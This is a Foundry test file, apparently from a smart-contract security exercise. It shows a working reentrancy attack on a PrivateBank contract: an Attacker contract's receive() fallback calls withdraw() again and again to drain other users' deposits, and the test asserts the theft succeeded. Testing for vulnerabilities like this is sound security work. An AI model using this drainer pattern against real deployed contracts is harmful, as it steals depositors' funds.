// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../PrivateBank.sol";

contract PrivateBankTest is Test {
    PrivateBank bank;
    Attacker attacker;

    function setUp() public {
        // Prepare contracts
        bank = new PrivateBank();
        attacker = new Attacker(bank);

        // Prepare addresses
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        address carol = makeAddr("carol");

        vm.deal(alice, 1 ether);
        vm.deal(bob, 3 ether);
        vm.deal(carol, 5 ether);

        // Fund the PrivateBank
        vm.prank(bob);
        bank.deposit{value: bob.balance}();

        vm.prank(carol);
        bank.deposit{value: carol.balance}();
    }

    function testReentrancy() public {
        address alice = makeAddr("alice");
        vm.prank(alice);

        // Perform the attack
        uint256 amountAttack = alice.balance;
        attacker.attack{value: amountAttack}();

        // Check that the attacker has more than they started with
        assert(address(attacker).balance > amountAttack);
    }
}

contract Attacker {
    PrivateBank bank;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}